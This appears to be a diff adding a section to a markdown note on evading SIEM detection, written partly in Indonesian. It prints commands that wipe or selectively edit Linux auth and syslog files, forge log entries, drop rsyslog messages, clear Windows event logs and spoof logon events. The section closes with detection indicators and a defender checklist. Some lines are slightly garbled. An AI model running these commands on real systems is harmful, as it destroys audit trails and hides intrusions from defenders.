@@ -114,3 +114,65 @@ Result: Detection pipeline = overwhelmed → real attack noise
 - Evil-WinRM log evasion — https://github.com/Hackplayers/evil-winrm
 - Sigma Rules — https://github.com/SigmaHQ/sigma
 - Log Tampering Research — https://www.ired.team/offensive-security/defense-evasion
+
+## Konkret — SIEM Bypass Payload (Testable)
+
+### Log Tampering (Linux)
+
+```bash
+# 1. Kosongkan log (cara kasar, meninggalkan timestamp gap)
+dd if=/dev/zero of=/var/log/auth.log bs=1M count=0
+truncate -s 0 /var/log/auth.log
+
+# 2. Selective delete (hapus entry attacker, sisanya tetap)
+sed -i '/attacker_ip/d' /var/log/auth.log
+sed -i '/1.2.3.4/d' /var/log/syslog
+
+# 3. Re-add log entry (forge timestamp)
+logger -t sshd "Accepted password for legituser from 10.0.0.1"
+# Tapi: timestamp log bisa beda dengan real time → correlation gap
+
+# 4. rsyslog manipulation
+# edit /etc/rssyslog.conf → drop rules
+:msg, contains, "attacker_ip" ~
+```
+
+### Windows Event Log
+
+```powershell
+# 1. Clear Security log (penuh; mustahil [...]
+Clear-EventLog -LogName Security, System, Application
+# Detection: EID 1102 (audit log cleared) — this itself is suspicious
+
+# 2. Selective deletion via deletion API
+# Requires admin + specific CVE/kom (polkit)
+# Delete single event via powershell (very noisy, rarely used)
+
+# 3. Event log spoofing (inject fake events)
+Write-EventLog -LogName Security -Source Microsoft-Windows-Security-Auditing -EventId 4624 -EntryType SuccessAudit -Message "An account was successfully logged on"
+```
+
+### Splunk (Correlation Gap)
+
+```
+# 1. Indikator timing gap (duration 0 antara login dan action)
+# 2. Log source drop (log tiba-tiba berhenti → attacker clear)
+# 3. User-agent anomaly (admin login dari IP biasa — BBOG IP)
+
+# Attacker strategies:
+# - Slow brute force: 1 attempt / jam → evades rate correlation
+# - Living off the land (powershell.exe, wmic.exe) → no malicious binary
+# - Timestomping (action time kelihatan normal)
+```
+
+### Checklist Defcheck
+
+1. Log manipulation → timestamp gap / source dan correlation
+2. Data source → yang biasanya tidak di-tamper (netflow, EDR telemetry)
+3. Sink correlation → cross-check syslog vs EDR vs network
+4. EID 1102, EID 4624 type 9 → special logon
+5. Tampering → integrity hash (md5 log file periodic)
+---
+
+audited
+---
